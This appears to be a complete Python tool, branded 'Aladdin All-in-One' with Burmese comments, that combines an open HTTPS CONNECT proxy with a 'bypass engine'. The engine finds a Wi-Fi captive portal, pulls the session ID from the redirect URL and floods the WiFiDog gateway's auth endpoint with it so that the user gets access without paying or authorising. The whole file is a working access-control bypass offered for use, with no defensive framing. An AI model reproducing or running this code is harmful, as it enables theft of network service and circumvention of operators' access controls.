import os
import socket
import threading
import requests
import time
from urllib.parse import urlparse, parse_qs

# --- CONFIGURATION ---
PROXY_PORT = 8080
PING_THREADS = 10  # Bypass လုပ်မယ့် အရှိန်

# Colors
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[0m"

def h_banner():
    os.system('clear')
    print(f"{C}{'='*55}")
    print(f"{G}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗")
    print(f"{G} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗")
    print(f"{G} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗")
    print(f"{G} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗")
    print(f"{G} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚███╗")
    print(f"{C}{'='*55}")
    print(f"{W}      ALADDIN ALL-IN-ONE | OWNER: MOE YU")
    print(f"{C}{'='*55}\n")

# ===============================
# ၁။ PROXY ENGINE (HTTPS Support)
# ===============================
def bridge(src, dest):
    try:
        while True:
            data = src.recv(8192)
            if not data: break
            dest.sendall(data)
    except: pass
    finally:
        try: src.close()
        except: pass
        try: dest.close()
        except: pass

def handle_client(client_socket):
    try:
        request = client_socket.recv(4096).decode('latin-1')
        if not request: return
        
        first_line = request.split('\n')[0]
        method = first_line.split(' ')[0]

        if method == "CONNECT":
            target = first_line.split(' ')[1]
            host, port = target.split(':')
            remote_socket = socket.create_connection((host, int(port)))
            client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
            
            threading.Thread(target=bridge, args=(client_socket, remote_socket), daemon=True).start()
            bridge(remote_socket, client_socket)
        else:
            client_socket.sendall(b"HTTP/1.1 501 Unsupported Method\r\n\r\n")
    except: pass
    finally: client_socket.close()

def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(100)
    print(f"{G}[✔] Proxy Engine Live on Port: {PROXY_PORT}")
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

# ===============================
# ၂။ BYPASS ENGINE (No Key)
# ===============================
def check_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def bypass_engine():
    print(f"{Y}[i] Scanning for Wi-Fi Portal...")
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if r.status_code == 204 and check_internet():
                time.sleep(10)
                continue

            portal_url = r.url
            parsed = urlparse(portal_url)
            sid = parse_qs(parsed.query).get('sessionId', [None])[0]

            if sid:
                print(f"{G}[✔] Portal Found! SID: {sid}")
                gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
                gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                for _ in range(PING_THREADS):
                    threading.Thread(target=lambda: [requests.get(auth_link) for _ in range(50)], daemon=True).start()
                print(f"{C}[*] Turbo Bypass Active!")
            
            time.sleep(5)
        except: time.sleep(5)

# ===============================
# ၃။ MAIN EXECUTION
# ===============================
if __name__ == "__main__":
    h_banner()
    # Proxy ကို Background Thread ဖြင့် Run မည်
    threading.Thread(target=start_proxy, daemon=True).start()
    
    # Bypass ကို Main Thread ဖြင့် Run မည်
    bypass_engine()
